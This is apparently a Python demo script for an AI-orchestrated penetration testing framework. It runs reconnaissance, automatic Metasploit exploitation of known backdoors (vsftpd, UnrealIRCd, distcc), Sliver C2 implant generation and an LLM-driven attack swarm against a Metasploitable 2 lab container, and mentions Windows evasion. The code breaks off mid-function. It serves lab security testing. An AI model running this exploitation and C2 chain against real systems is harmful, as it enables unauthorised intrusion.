#!/usr/bin/env python3
"""
PHALANX v3.6 – Demo against Metasploitable 2 and optional WordPress target.

ENHANCEMENTS (Phase 7 + Fallback Tools):
- Automatically runs WordPress scanner when web service detected.
- New --wp-target flag to demo against a separate WordPress instance.
- Enhanced recon phase with wp_scanner and wpscan integration.
- Added enum4linux when SMB (port 445) is detected.
- Added theHarvester for OSINT enumeration.
- Graceful fallback when tools are not available.
- Added optional defense monitoring (--defense flag).
- Fixed bootstrap_all unpacking error.
- Added --winstealth flag to enable WinStealth for Windows targets (renamed from SindriKit).
- Added check for Ollama availability and model pulling if missing in swarm demo.
- Improved error handling for missing tools and services.
- Added check for Metasploitable2 container before starting demo, with auto-start if available.

NEW: --reverse-demo flag – runs a reverse engineering demo on a target file (APK, binary, JS, etc.)
      using the reverse skill routing system. Uses --target-file to specify the file.

NEW: --raptor-demo flag – runs a short Raptor loop against a local codebase (or Metasploitable source)
      for verification. Uses the looped transformer harness with a small number of iterations.
      Optionally specify a target directory with --raptor-target.

NEW (v3.6.2):
- Added `use_raptor` parameter to `run_swarm_demo` (default True) to enable Raptor loop in swarm demos.
- Added `--shell-demo` flag to test the shell tool (requires PHALANX_ALLOW_SHELL=1 or config allow_shell).
- The shell demo runs a set of safe commands (echo, whoami, uname) to verify shell execution.

FIXES in this version:
- Centralized path handling by importing from phalanx_core.
- Removed duplicate directory creation functions.
- Enhanced error messages with actionable suggestions.
- Added more robust checks for tool availability.
- Improved logging and progress output.
- Safe import of phalanx_defense (optional).
- Handle None result from run_swarm.
- Initialize defense_monitor variable before conditional use.
- Fallback for missing Docker in ensure_metasploitable_container.
- Handle None skill from route_reverse_skill.
- Bootstrap_all called with proper config.
- Added validation and fallback for generate_engagement_plan in run_demo.
- Container startup now gracefully handles missing Docker (prints warnings, continues).
"""

import json
import time
import sys
import subprocess
import shutil
from datetime import datetime
from pathlib import Path
from typing import Dict, Optional, Any, List
import socket
import re
import os

# Core imports (required)
from phalanx_core import PhalanxDB, Soul, SkillManager, BASE_DIR, REPORTS_DIR

# Optional defense module – safe import
try:
    from phalanx_defense import NetWatchMonitor
    DEFENSE_AVAILABLE = True
except ImportError:
    DEFENSE_AVAILABLE = False
    NetWatchMonitor = None

# Library imports (required)
from phalanx_library import (
    generate_engagement_plan,
    run_swarm,
    list_ollama_models,
    pull_ollama_model,
    route_reverse_skill,
    bootstrap_all,
    get_logger,
    PhalanxLoopedHarness
)
from phalanx_tools import Gateway, TOOL_REGISTRY
from phalanx_engine import ToolExecutor

# ------------------------------------------------------------------
# Logger
# ------------------------------------------------------------------
logger = get_logger("phalanx.demo")

# ------------------------------------------------------------------
# Paths – consistent with rest of PHALANX (imported from core)
# ------------------------------------------------------------------
SWARM_CAMPAIGNS_FILE = BASE_DIR / "swarm_campaigns.json"


# ------------------------------------------------------------------
# Target reachability check (Metasploitable2 container)
# ------------------------------------------------------------------
def check_target_reachable(target: str, ports: list = None) -> bool:
    """
    Check if the target is reachable on any of the given ports.
    Returns True if at least one port is reachable.
    """
    if ports is None:
        ports = [22, 80, 443]  # SSH, HTTP, HTTPS
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            if result == 0:
                return True
        except Exception:
            continue
    return False


# ------------------------------------------------------------------
# Ensure Metasploitable2 container is running (with Docker fallback)
# ------------------------------------------------------------------
def ensure_metasploitable_container() -> bool:
    """
    Check if the phalanx-target container is running.
    If it exists but is stopped, attempt to start it.
    If it doesn't exist, print a warning and return False.
    Returns True if the container is running or was started successfully.
    """
    # Check if docker command exists
    if not shutil.which("docker"):
        logger.warning("Docker not found. Cannot manage Metasploitable2 container.")
        return False

    try:
        # Check if container is running
        result = subprocess.run(
            ["docker", "ps", "--filter", "name=phalanx-target", "--format", "{{.Status}}"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout.strip():
            status = result.stdout.strip()
            if "Up" in status:
                logger.info("Metasploitable2 container (phalanx-target) is running.")
                return True
            else:
                logger.warning(f"phalanx-target container exists but is not running (status: {status}).")
        else:
            # Check if container exists (but stopped)
            result_all = subprocess.run(
                ["docker", "ps", "-a", "--filter", "name=phalanx-target", "--format", "{{.Status}}"],
                capture_output=True, text=True, timeout=5
            )
            if result_all.returncode == 0 and result_all.stdout.strip():
                logger.warning(f"phalanx-target container exists but is not running (status: {result_all.stdout.strip()}).")
            else:
                logger.warning("phalanx-target container does not exist.")
                logger.warning("Please create it with: docker run -d --name phalanx-target --network phalanx-net tleemcjr/metasploitable2:latest")
                return False

        # Attempt to start the container
        logger.info("Attempting to start phalanx-target container...")
        start_result = subprocess.run(
            ["docker", "start", "phalanx-target"],
            capture_output=True, text=True, timeout=10
        )
        if start_result.returncode == 0:
            logger.info("phalanx-target started successfully.")
            return True
        else:
            logger.error(f"Failed to start phalanx-target: {start_result.stderr.strip()}")
            return False

    except Exception as e:
        logger.error(f"Error checking/starting container: {e}")
        return False


# ------------------------------------------------------------------
# Extract domain from target (for OSINT tools)
# ------------------------------------------------------------------
def extract_domain(target: str) -> str:
    """Extract domain name from a target (IP or hostname)."""
    # Remove protocol
    target = re.sub(r'^https?://', '', target)
    # Split port
    target = target.split(':')[0]
    # If it looks like an IP, return as is (theHarvester will handle)
    return target


# ------------------------------------------------------------------
# Check Ollama availability and pull model if missing
# ------------------------------------------------------------------
def ensure_ollama_model(model: str) -> bool:
    """Check if Ollama is running and the model is available; pull if missing."""
    try:
        # Check if ollama command exists
        if not shutil.which("ollama"):
            logger.error("Ollama not installed. Please install from https://ollama.com")
            return False
        # List installed models
        models_local = list_ollama_models()
        if model not in models_local:
            logger.info(f"Model {model} not found locally. Pulling...")
            if pull_ollama_model(model):
                logger.info(f"Model {model} pulled successfully.")
                return True
            else:
                logger.error(f"Failed to pull {model}. Using fallback if available.")
                return False
        return True
    except Exception as e:
        logger.error(f"Ollama check failed: {e}")
        return False


# ------------------------------------------------------------------
# Dynamic vulnerability detection and exploitation (including WordPress)
# ------------------------------------------------------------------
def detect_vulnerabilities(target: str, gateway: Gateway) -> Dict:
    """Run nuclei to detect vulnerabilities on the target."""
    logger.info(f"Running nuclei against {target}...")
    result = gateway.run_tool("nuclei", {"target": target, "options": "-severity critical,high"})
    # Guard against None result
    if result is None:
        result = {}
    findings = []
    if result.get("rc", -1) == 0 and "parsed" in result:
        findings = result["parsed"].get("findings", [])
    return {"findings": findings, "raw_output": result.get("output", "")}


def detect_wordpress(target: str, gateway: Gateway) -> Dict:
    """Run WordPress scanner if target appears to be a web server."""
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    logger.info(f"Running WordPress scanner against {target}...")
    result = gateway.run_tool("wp_scanner", {"target": target})
    # Guard against None result
    if result is None:
        result = {}
    if result.get("rc", -1) == 0:
        try:
            wp_data = json.loads(result.get("output", "{}"))
            if wp_data.get("wordpress_detected"):
                logger.info(f"WordPress detected – Version: {wp_data.get('version', 'unknown')}")
                logger.info(f"Plugins: {', '.join(wp_data.get('plugins', []))}")
                for vuln in wp_data.get("vulnerabilities", [])[:3]:
                    logger.info(f"CVE: {vuln.get('cve')} - {vuln.get('description')[:80]}")
                return wp_data
        except json.JSONDecodeError:
            pass
    return {"wordpress_detected": False}


def attempt_exploit(vulnerability: Dict, target: str, gateway: Gateway) -> Dict:
    """
    Attempt to exploit a given vulnerability.
    If a Metasploit module is known (via searchsploit or mapping), run it.
    Returns result dict with success status.
    """
    name = vulnerability.get("name", "")
    cve_id = vulnerability.get("cve_id", [])
    if cve_id:
        cve = cve_id[0] if isinstance(cve_id, list) else cve_id
        logger.info(f"Attempting exploit for {name} ({cve})...")
    else:
        logger.info(f"Attempting exploit for {name}...")

    exploit_map = {
        "vsftpd 2.3.4 backdoor": "exploit/unix/ftp/vsftpd_234_backdoor",
        "UnrealIRCd Backdoor": "exploit/unix/irc/unreal_ircd_3281_backdoor",
        "DistCC Executable Injection": "exploit/unix/misc/distcc_exec",
        "Java RMI Server Insecure Default Configuration": "exploit/multi/misc/java_rmi_server",
    }
    module = None
    for key, mod in exploit_map.items():
        if key.lower() in name.lower():
            module = mod
            break
    if module:
        res = gateway.run_tool("msfconsole", {"resource": module})
        if res is None:
            res = {}
        success = res.get("rc", -1) == 0
        return {"success": success, "module": module, "output": res.get("output", "")[:500]}
    else:
        search_result = gateway.run_tool("searchsploit", {"query": name})
        if search_result is None:
            search_result = {}
        if search_result.get("rc", -1) == 0 and search_result.get("output"):
            logger.info(f"Found possible exploits via searchsploit: {search_result['output'][:200]}")
            return {"success": False, "module": "searchsploit", "output": search_result["output"][:500]}
    return {"success": False, "module": None, "output": "No exploit module available"}


# ------------------------------------------------------------------
# Fallback static plan for demo
# ------------------------------------------------------------------
def _get_static_demo_plan(target: str) -> Dict[str, Any]:
    """Generate a static plan for demo when the AI planner fails."""
    safe_target = re.sub(r'[^a-zA-Z0-9\.\-_:]', '', target)[:100] or "unknown-target"
    return {
        "objectives": [
            {"description": f"Reconnaissance of {safe_target}", "mitre_tags": ["T1595"], "evidence_guided": False},
            {"description": f"Vulnerability assessment of {safe_target}", "mitre_tags": ["T1595.002"], "evidence_guided": False},
            {"description": f"Exploitation of {safe_target}", "mitre_tags": ["T1190"], "evidence_guided": True},
            {"description": f"Post‑exploitation and pivoting", "mitre_tags": ["T1003"], "evidence_guided": True},
            {"description": f"Reporting", "mitre_tags": [], "evidence_guided": False}
        ],
        "roe": {
            "allowed_targets": [safe_target],
            "excluded_targets": [],
            "forbidden_actions": ["data_exfiltration", "destruction"],
            "require_human_confirm": ["privilege_escalation", "exploit"],
            "max_severity": "critical"
        },
        "generated_by": "demo_static_fallback",
        "schema_version": "2.0"
    }


# ------------------------------------------------------------------
# Linear/agentic demo (dynamic vulnerability exploitation + WordPress + SMB)
# ------------------------------------------------------------------
def run_demo(config: dict, soul: Soul, skill_mgr: SkillManager,
             db: PhalanxDB, executor: ToolExecutor, gateway: Gateway,
             wp_target: Optional[str] = None,
             defense_monitor: Optional[Any] = None) -> dict:
    """
    Full autonomous demo – planning, recon, exploit, C2, reporting.
    If wp_target is provided, also scan that WordPress instance.
    If defense_monitor is provided, start and stop monitoring around demo.
    WinStealth is enabled via config["winstealth"]["enabled"].
    """
    # Guard against None config
    if config is None:
        config = {}

    target = config.get("demo_target", "metasploitable2")
    logger.info(f"Starting PHALANX demo against {target}")
    if wp_target:
        logger.info(f"Additional WordPress target: {wp_target}")

    # Check if WinStealth is enabled
    if config.get("winstealth", {}).get("enabled", False):
        logger.info("WinStealth enabled – Windows low-level evasion will be used if target is Windows")

    # Ensure Metasploitable2 container is running (if target is the default)
    if target == "metasploitable2" or target == "phalanx-target":
        if not ensure_metasploitable_container():
            logger.warning("Metasploitable2 container not available. Some features may fail.")

    # Initialize defense_monitor variable before conditional use
    if defense_monitor is not None and DEFENSE_AVAILABLE:
        defense_monitor.start()
        logger.info("Defense monitoring started")

    if not check_target_reachable(target):
        logger.warning(f"Target {target} does not respond on ports 22, 80, or 443.")
        logger.warning("Make sure the Metasploitable2 container is running:")
        logger.warning("  docker start phalanx-target  (or ./run.sh)")
        logger.warning("Continuing anyway – some tools may fail.")

    # 1. Planning
    logger.info("[Phase 1] Generating OPPLAN...")
    plan = generate_engagement_plan(target, "Full kill chain demo", gateway)

    # Validate plan and fallback if needed
    if not plan or not isinstance(plan, dict) or "objectives" not in plan:
        logger.warning("Generated plan invalid, using fallback static plan for demo.")
        plan = _get_static_demo_plan(target)

    session_id = None
    sessions = db.list_sessions(1)
    if not sessions:
        db.create_session(target, "demo", ["plan", "recon", "exploit", "c2"])
        sessions = db.list_sessions(1)
    if sessions:
        session_id = sessions[0]["session_id"]
        for obj in plan.get("objectives", []):
            db.add_objective(session_id, obj["description"], obj.get("mitre_tags", []))

    # 2. Reconnaissance
    logger.info("[Phase 2] Reconnaissance...")
    recon_tools = ["nmap", "nikto", "whatweb"]
    recon_results = {}
    for tool in recon_tools:
        logger.info(f"  Running {tool}...")
        if tool == "nmap":
            res = gateway.run_tool(tool, {"target": target, "options": "-sV -p- --open"})
        else:
            res = gateway.run_tool(tool, {"target": target})
        # Guard against None
        if res is None:
            res = {}
        recon_results[tool] = res
        if session_id and res.get("rc", -1) == 0:
            db.add_finding(target, tool, "info", f"Recon output from {tool}", res.get("output", "")[:500])

    nmap_out = recon_results.get("nmap", {}).get("output", "")

    # 2b. SMB enumeration if port 445 open
    if "445/tcp open" in nmap_out:
        logger.info("SMB (port 445) detected – running enum4linux...")
        enum_res = gateway.run_tool("enum4linux", {"target": target})
        if enum_res is None:
            enum_res = {}
        if enum_res.get("rc", -1) == 0:
            if session_id:
                db.add_finding(target, "enum4linux", "info", "SMB enumeration completed", enum_res.get("output", "")[:500])
            soul.ingest_loot({"type": "smb_enum", "target": target, "findings": enum_res.get("output", "")[:1000]})
        else:
            logger.warning(f"enum4linux failed (rc={enum_res.get('rc')})")

    # 2c. OSINT with theHarvester (use domain if available)
    domain = extract_domain(target)
    if domain:
        logger.info(f"Running theHarvester OSINT on {domain}...")
        harv_res = gateway.run_tool("theharvester", {"domain": domain, "sources": "all"})
        if harv_res is None:
            harv_res = {}
        if harv_res.get("rc", -1) == 0:
            if session_id:
                db.add_finding(target, "theharvester", "info", "OSINT email/subdomain gathering", harv_res.get("output", "")[:500])
            soul.ingest_loot({"type": "osint", "target": domain, "findings": harv_res.get("output", "")[:1000]})
        else:
            logger.warning(f"theHarvester failed (rc={harv_res.get('rc')})")

    # 3. WordPress scanning
    wp_data = {}
    if wp_target:
        wp_data = detect_wordpress(wp_target, gateway)
        if wp_data.get("wordpress_detected"):
            db.add_finding(wp_target, "wp_scanner", "info", "WordPress scan completed", json.dumps(wp_data)[:500])
            if session_id:
                for vuln in wp_data.get("vulnerabilities", []):
                    db.add_vulnerability(session_id, vuln.get("name", "WordPress vuln"), "medium",
                                         vuln.get("description", ""), cve=vuln.get("cve", ""))
            # Also run wpscan for deeper enumeration
            logger.info(f"Running wpscan on {wp_target}...")
            wpscan_res = gateway.run_tool("wpscan", {"target": wp_target})
            if wpscan_res is None:
                wpscan_res = {}
            if wpscan_res.get("rc", -1) == 0:
                if session_id:
                    db.add_finding(wp_target, "wpscan", "info", "WPScan completed", wpscan_res.get("output", "")[:500])
                soul.ingest_loot({"type": "wordpress", "target": wp_target, "findings": wpscan_res.get("output", "")[:1000]})
    else:
        # Check if main target might have web interface (port 80/443)
        if "80/tcp open" in nmap_out or "443/tcp open" in nmap_out:
            logger.info("Web server detected – running WordPress scanner...")
            wp_data = detect_wordpress(target, gateway)
            if wp_data.get("wordpress_detected"):
                db.add_finding(target, "wp_scanner", "info", "WordPress scan completed", json.dumps(wp_data)[:500])
                logger.info(f"Running wpscan on {target}...")
                wpscan_res = gateway.run_tool("wpscan", {"target": target})
                if wpscan_res is None:
                    wpscan_res = {}
                if wpscan_res.get("rc", -1) == 0:
                    if session_id:
                        db.add_finding(target, "wpscan", "info", "WPScan completed", wpscan_res.get("output", "")[:500])

    # 4. Vulnerability Detection & Exploitation (traditional)
    logger.info("[Phase 3] Vulnerability detection...")
    vuln_data = detect_vulnerabilities(target, gateway)
    vulnerabilities = vuln_data.get("findings", [])
    logger.info(f"Found {len(vulnerabilities)} vulnerabilities (critical/high severity).")

    exploits = []
    for vuln in vulnerabilities[:3]:
        exploit_result = attempt_exploit(vuln, target, gateway)
        exploits.append({
            "name": vuln.get("name", "unknown"),
            "tool": exploit_result.get("module", "none"),
            "success": exploit_result.get("success", False),
            "output": exploit_result.get("output", "")
        })
        if exploit_result.get("success"):
            logger.info(f"Exploit succeeded for {vuln.get('name')}")
            break
        else:
            logger.info(f"Exploit attempt for {vuln.get('name')} failed or no module found.")

    # Fallback to vsftpd if present
    if not any(e["success"] for e in exploits):
        if "vsftpd 2.3.4" in nmap_out:
            logger.info("Fallback: vsftpd 2.3.4 detected – launching exploit")
            res = gateway.run_tool("msfconsole", {"resource": "exploit/unix/ftp/vsftpd_234_backdoor"})
            if res is None:
                res = {}
            exploits.append({
                "name": "vsftpd_234_backdoor",
                "tool": "msfconsole",
                "success": res.get("rc", -1) == 0,
                "output": res.get("output", "")[:500]
            })
        elif "UnrealIRCd" in nmap_out:
            logger.info("Fallback: UnrealIRCd backdoor detected – launching exploit")
            res = gateway.run_tool("msfconsole", {"resource": "exploit/unix/irc/unreal_ircd_3281_backdoor"})
            if res is None:
                res = {}
            exploits.append({
                "name": "unreal_ircd_backdoor",
                "tool": "msfconsole",
                "success": res.get("rc", -1) == 0,
                "output": res.get("output", "")[:500]
            })

    # 5. C2 deployment (simulated)
    logger.info("[Phase 4] C2 deployment...")
    c2_result = {}
    try:
        res = gateway.run_tool("sliver_generate", {"target_ip": target, "mtls_port": 443})
        if res is None:
            res = {}
        if res.get("rc", -1) == 0:
            logger.info("Sliver implant generated successfully")
            c2_result = {"status": "success", "output": res.get("output", "")[:200]}
        else:
            c2_result = {"status": "failed", "error": res.get("error", "Unknown error")}
    except Exception as e:
        c2_result = {"status": "failed", "error": str(e)}
        logger.error(f"C2 deployment failed: {e}")

    # 6. Reporting
    logger.info("[Phase 5] Generating report...")
    report = {
        "target": target,
        "wordpress_target": wp_target if wp_target else None,
        "wordpress_findings": wp_data,
        "timestamp": datetime.utcnow().isoformat(),
        "plan": plan,
        "recon_summary": {k: v.get("rc", -1) for k, v in recon_results.items()},
        "vulnerabilities_detected": vulnerabilities[:10],
        "exploits": exploits,
        "c2": c2_result,
        "findings_count": len(db.get_findings(1000)) if session_id else 0
    }
    report_path = REPORTS_DIR / f"demo_{target}_{int(time.time())}.json"
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(report, indent=2))
    logger.info(f"Demo report saved to {report_path}")

    if session_id:
        db.finish_session(session_id, "completed")

    if defense_monitor is not None and DEFENSE_AVAILABLE:
        defense_monitor.stop()
        logger.info("Defense monitoring stopped")

    return report


# ------------------------------------------------------------------
# Create campaign record using file-based fallback
# ------------------------------------------------------------------
def _create_campaign_record(campaign_id: str, target: str, model: str) -> None:
    """Create campaign record in a JSON file (fallback when DB method missing)."""
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    campaigns = {}
    if SWARM_CAMPAIGNS_FILE.exists():
        try:
            campaigns = json.loads(SWARM_CAMPAIGNS_FILE.read_text())
        except Exception:
            pass
    campaigns[campaign_id] = {
        "target": target,
        "mode": "ctf",
        "model": model,
        "status": "running",
        "started_at": datetime.utcnow().isoformat()
    }
    SWARM_CAMPAIGNS_FILE.write_text(json.dumps(campaigns, indent=2))


# ------------------------------------------------------------------
# Swarm-based demo (CTF mode against Metasploitable 2 + optional WordPress)
# ------------------------------------------------------------------
def run_swarm_demo(
    config: dict,
    soul: Soul,
    skill_mgr: SkillManager,
    db: PhalanxDB,
    executor: ToolExecutor,
    gateway: Gateway,
    enable_shadow_graph: bool = False,
    enable_looped: bool = False,
    looped_harness: Optional[Any] = None,
    wp_target: Optional[str] = None,
    defense_monitor: Optional[Any] = None,
    use_raptor: bool = True  # NEW: default enable Raptor loop in swarm
) -> dict:
    """
    Run a swarm demo against the local Metasploitable 2 container.
    Optionally scan a separate WordPress target.
    WinStealth is enabled via config["winstealth"]["enabled"].
    If use_raptor is True, the swarm will use the Raptor loop engine (altitude-aware generator/judge).
    """
    # Guard against None config
    if config is None:
        config = {}

    target = config.get("demo_target", "metasploitable2")
    logger.info(f"Starting SWARM demo against {target} (CTF mode)")
    if wp_target:
        logger.info(f"Additional WordPress target: {wp_target}")
    if enable_shadow_graph:
        logger.info("Shadow Graph ENABLED – tracking relationships and loot")
    if enable_looped:
        logger.info("Looped Harness ENABLED – background recurrent-depth reasoning")
    if use_raptor:
        logger.info("Raptor loop ENABLED – altitude-aware generator/judge reasoning")

    # Check if WinStealth is enabled
    if config.get("winstealth", {}).get("enabled", False):
        logger.info("WinStealth enabled – Windows low-level evasion will be used if target is Windows")

    # Ensure Metasploitable2 container is running (if target is the default)
    if target == "metasploitable2" or target == "phalanx-target":
        if not ensure_metasploitable_container():
            logger.warning("Metasploitable2 container not available. Some features may fail.")

    # Initialize defense_monitor variable before conditional use
    if defense_monitor is not None and DEFENSE_AVAILABLE:
        defense_monitor.start()
        logger.info("Defense monitoring started")

    if not check_target_reachable(target):
        logger.warning(f"Target {target} does not respond on ports 22, 80, or 443.")
        logger.warning("Make sure the Metasploitable2 container is running:")
        logger.warning("  docker start phalanx-target  (or ./run.sh)")
        logger.warning("Continuing anyway – some tools may fail.")

    # Ensure Ollama and model are ready
    model = config.get("swarm", {}).get("default_model", "qwen2.5:0.5b")
    if not ensure_ollama_model(model):
        logger.error(f"Model {model} not available and could not be pulled. Using fallback.")
        model = "qwen2.5:0.5b"  # fallback, but likely already tried

    campaign_id = f"swarm_demo_{int(time.time())}"
    try:
        if hasattr(db, 'create_swarm_campaign'):
            db.create_swarm_campaign(campaign_id, target, scope=target, mode="ctf", model_used=model)
        else:
            _create_campaign_record(campaign_id, target, model)
    except Exception as e:
        logger.error(f"Failed to create campaign record: {e}. Continuing anyway.")

    logger.info(f"Swarm campaign ID: {campaign_id}")

    # If WordPress target provided, run both wp_scanner and wpscan
    if wp_target:
        logger.info(f"Running WordPress scanner on {wp_target}...")
        wp_result = gateway.run_tool("wp_scanner", {"target": wp_target})
        if wp_result is None:
            wp_result = {}
        if wp_result.get("rc", -1) == 0:
            try:
                wp_data = json.loads(wp_result.get("output", "{}"))
                if wp_data.get("wordpress_detected"):
                    logger.info(f"WordPress detected: {wp_data.get('version', 'unknown')}")
                    soul.ingest_loot({
                        "type": "wordpress",
                        "target": wp_target,
                        "findings": wp_data
                    })
                    if hasattr(db, 'add_loot'):
                        db.add_loot("wordpress", wp_data, campaign_id=campaign_id)
                    # Run wpscan
                    logger.info(f"Running wpscan on {wp_target}...")
                    wpscan_res = gateway.run_tool("wpscan", {"target": wp_target})
                    if wpscan_res is None:
                        wpscan_res = {}
                    if wpscan_res.get("rc", -1) == 0:
                        soul.ingest_loot({"type": "wordpress", "target": wp_target, "findings": wpscan_res.get("output", "")[:1000]})
            except json.JSONDecodeError:
                pass

    # Pre‑run nmap to detect open ports for conditional tools in swarm orchestrator
    logger.info("Running initial nmap scan to detect services...")
    nmap_res = gateway.run_tool("nmap", {"target": target, "options": "-sV -p- --open"})
    if nmap_res is None:
        nmap_res = {}
    nmap_out = nmap_res.get("output", "")
    if "445/tcp open" in nmap_out:
        logger.info("SMB detected – enum4linux will be run by swarm orchestration")

    domain = extract_domain(target)
    if domain:
        logger.info(f"Running theHarvester OSINT on {domain}...")
        harv_res = gateway.run_tool("theharvester", {"domain": domain, "sources": "all"})
        if harv_res is None:
            harv_res = {}
        if harv_res.get("rc", -1) == 0:
            soul.ingest_loot({"type": "osint", "target": domain, "findings": harv_res.get("output", "")[:1000]})

    def progress_cb(msg: str) -> None:
        logger.info(f"[swarm] {msg}")

    if enable_looped and looped_harness is not None:
        if hasattr(looped_harness, 'start'):
            looped_harness.start(target)
            logger.info("Looped harness started in background")
        else:
            logger.warning("Looped harness requested but invalid – skipping")
    elif enable_looped and looped_harness is None:
        logger.warning("Looped harness requested but not available (PyTorch missing?) – skipping")

    result = None
    try:
        # Pass the winstealth config to run_swarm via the config dict; the orchestrator will read it.
        result = run_swarm(
            target=target,
            scope=target,
            mode="ctf",
            model=model,
            follow=True,
            progress_callback=progress_cb,
            db=db,
            soul=soul,
            skill_mgr=skill_mgr,
            gateway=gateway,
            enable_hierarchical=True,
            enable_shadow_graph=enable_shadow_graph,
            use_raptor=use_raptor  # NEW: pass the flag
        )
        # Handle None result
        if result is None:
            result = {}
            logger.warning("Swarm returned None, using empty dict")

        final_report = result.get("report", result.get("final_report", {}))
        if not final_report:
            final_report = {
                "recon_findings": result.get("recon_findings", {}),
                "validated_vulnerabilities": result.get("validated_vulnerabilities", []),
                "exploit_plan": result.get("exploit_plan", [])
            }

        report_data = {
            "target": target,
            "wordpress_target": wp_target,
            "campaign_id": campaign_id,
            "mode": "ctf",
            "timestamp": datetime.utcnow().isoformat(),
            "shadow_graph_enabled": enable_shadow_graph,
            "looped_harness_enabled": enable_looped,
            "winstealth_enabled": config.get("winstealth", {}).get("enabled", False),
            "use_raptor": use_raptor,
            "recon_findings": result.get("recon_findings", {}),
            "validated_vulnerabilities": result.get("validated_vulnerabilities", []),
            "exploit_plan": result.get("exploit_plan", [])
        }
        report_path = REPORTS_DIR / f"swarm_demo_{campaign_id}.json"
        report_path.parent.mkdir(parents=True, exist_ok=True)
        report_path.write_text(json.dumps(report_data, indent=2))
        logger.info(f"Swarm demo report saved to {report_path}")

        try:
            if hasattr(db, 'update_swarm_campaign'):
                db.update_swarm_campaign(campaign_id, "completed", str(report_path))
            else:
                if SWARM_CAMPAIGNS_FILE.exists():
                    campaigns = json.loads(SWARM_CAMPAIGNS_FILE.read_text())
                    if campaign_id in campaigns:
                        campaigns[campaign_id]["status"] = "completed"
                        campaigns[campaign_id]["final_report_path"] = str(report_path)
                        SWARM_CAMPAIGNS_FILE.write_text(json.dumps(campaigns, indent=2))
        except Exception as e:
            logger.error(f"Failed to update campaign status: {e}")

    except Exception as e:
        logger.error(f"Swarm demo failed: {e}")
        return {
            "error": str(e),
            "campaign_id": campaign_id,
            "partial": result if result else None
        }
    finally:
        if enable_looped and looped_harness is not None and hasattr(looped_harness, 'stop'):
            looped_harness.stop()
            logger.info("Looped harness stopped")
        if defense_monitor is not None and DEFENSE_AVAILABLE:
            defense_monitor.stop()
            logger.info("Defense monitoring stopped")

    return report_data


# ======================================================================
# SHELL DEMO – test shell tool
# ======================================================================
def run_shell_demo(
    config: dict,
    soul: Soul,
    skill_mgr: SkillManager,
    db: PhalanxDB,
    executor: ToolExecutor,
    gateway: Gateway,
    defense_monitor: Optional[Any] = None
) -> dict:
    """
    Run a simple shell command demo to verify the shell tool is working.
    This requires PHALANX_ALLOW_SHELL=1 or config["allow_shell"] = True.
    """
    if config is None:
        config = {}

    logger.info("Starting SHELL tool demo...")
    if defense_monitor is not None and DEFENSE_AVAILABLE:
        defense_monitor.start()
        logger.info("Defense monitoring started")

    # Ensure shell is allowed
    if not (os.environ.get("PHALANX_ALLOW_SHELL", "0") == "1" or config.get("allow_shell", False)):
        logger.warning("Shell execution not allowed. Set PHALANX_ALLOW_SHELL=1 or config['allow_shell']=True")
        return {"error": "Shell execution not allowed."}

    commands = [
        "echo 'PHALANX shell demo: Hello World'",
        "whoami",
        "uname -a"
    ]
    results = {}
    for cmd in commands:
        logger.info(f"Executing shell command: {cmd}")
        try:
            res = gateway.run_tool("shell", {"command": cmd, "timeout": 10})
            if res is None:
                res = {}
            output = res.get("output", "")
            error = res.get("error")
            rc = res.get("rc", -1)
            results[cmd] = {"output": output, "error": error, "rc": rc}
            if rc == 0:
                logger.info(f"Command succeeded: {output[:100]}")
            else:
                logger.warning(f"Command failed with rc {rc}: {error}")
        except Exception as e:
            logger.error(f"Shell command failed: {e}")
            results[cmd] = {"error": str(e), "rc": -1}

    report = {
        "demo": "shell",
        "timestamp": datetime.utcnow().isoformat(),
        "results": results,
        "summary": f"Ran {len(commands)} shell commands."
    }

    report_path = REPORTS_DIR / f"shell_demo_{int(time.time())}.json"
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(report, indent=2))
    logger.info(f"Shell demo report saved to {report_path}")

    if defense_monitor is not None and DEFENSE_AVAILABLE:
        defense_monitor.stop()
        logger.info("Defense monitoring stopped")

    return report


# ======================================================================
# REVERSE ENGINEERING DEMO
# ======================================================================
def run_reverse_demo(
    config: dict,
    soul: Soul,
    skill_mgr: SkillManager,
    db: PhalanxDB,
    executor: ToolExecutor,
    gateway: Gateway,
    target_file: str,
    defense_monitor: Optional[Any] = None
) -> dict:
    """
    Run a reverse engineering demo on a target file (APK, binary, JS, etc.).
    Uses the reverse skill routing system to determine the appropriate tools.
    """
    # Guard against None config
    if config is None:
        config = {}

    logger.info(f"Starting REVERSE ENGINEERING demo on file: {target_file}")
    if not Path(target_file).exists():
        logger.error(f"File not found: {target_file}")
        return {"error": f"File not found: {target_file}"}

    if defense_monitor is not None and DEFENSE_AVAILABLE:
        defense_monitor.start()
        logger.info("Defense monitoring started")

    # Determine the skill using the router; fallback to "generic"
    skill = route_reverse_skill(target_file, skill_mgr) or "generic"
    logger.info(f"Routed to skill: {skill}")

    # Create a session for tracking
    session_id = db.create_session(target_file, "reverse_demo", [skill])
    logger.info(f"Session ID: {session_id}")

    # Execute the appropriate tool chain based on the skill
    results = {}
    findings = []
    if skill == "apk-reverse":
        logger.info("Running apk-reverse skill: jadx and apktool...")
        # Run jadx
        jadx_result = gateway.run_tool("jadx", {"target": target_file})
        if jadx_result is None:
            jadx_result = {}
        results["jadx"] = jadx_result
        if jadx_result.get("rc", -1) == 0:
            db.add_finding(target_file, "jadx", "info", "Decompiled APK", jadx_result.get("output", "")[:500])
            findings.append({"tool": "jadx", "output": jadx_result.get("output", "")[:200]})
        else:
            logger.warning(f"jadx failed: {jadx_result.get('error', 'Unknown error')}")

        # Run apktool
        apktool_result = gateway.run_tool("apktool", {"target": target_file})
        if apktool_result is None:
            apktool_result = {}
        results["apktool"] = apktool_result
        if apktool_result.get("rc", -1) == 0:
            db.add_finding(target_file, "apktool", "info", "Decoded APK resources", apktool_result.get("output", "")[:500])
            findings.append({"tool": "apktool", "output": apktool_result.get("output", "")[:200]})
        else:
            logger.warning(f"apktool failed: {apktool_result.get('error', 'Unknown error')}")

        # Optionally run radare2 for deeper analysis
        logger.info("Running radare2 for additional analysis...")
        r2_result = gateway.run_tool("radare2", {"target": target_file, "commands": "aaa"})
        if r2_result is None:
            r2_result = {}
        results["radare2"] = r2_result
